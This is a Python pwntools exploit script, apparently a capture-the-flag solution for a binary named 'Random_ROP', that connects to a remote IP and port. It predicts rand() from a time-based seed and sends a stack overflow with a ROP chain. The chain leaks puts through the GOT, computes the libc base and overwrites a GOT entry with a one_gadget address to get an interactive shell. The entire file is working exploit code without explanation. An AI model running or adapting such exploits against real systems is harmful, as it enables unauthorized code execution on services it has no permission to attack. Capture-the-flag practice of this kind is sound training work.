from pwn import *
import ctypes

#lib = ctypes.CDLL('./libc.so.6')
lib = ctypes.CDLL('/lib/x86_64-linux-gnu/libc.so.6')
p = remote('211.170.162.121', 3333)
#p = process('./random')
lib.srand(lib.time(0))
elf = ELF('./Random_ROP')
libc = ELF('./libc.so.6')

context.log_level='debug'

p.send('a')
p.send('b')

p.sendline(str(lib.rand()))

poprdi = 0x400B43
poprsi_r15 = poprdi-2

pay = 'A'*0x400 + 'B'*8
pay += p64(poprdi) + p64(elf.got['puts']) + p64(elf.plt['puts'])
pay += p64(poprdi) + p64(elf.got['puts']) + p64(elf.plt['gets'])
pay += p64(elf.plt['puts'])
pay += p64(0)*40


pause()
p.sendline(pay)
#p.recvuntil('OK!\n')
leak = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
libcbase = leak - libc.symbols['puts']
print "0x%x" % libcbase
p.sendline(p64(libcbase + 0x4f322))
p.interactive()
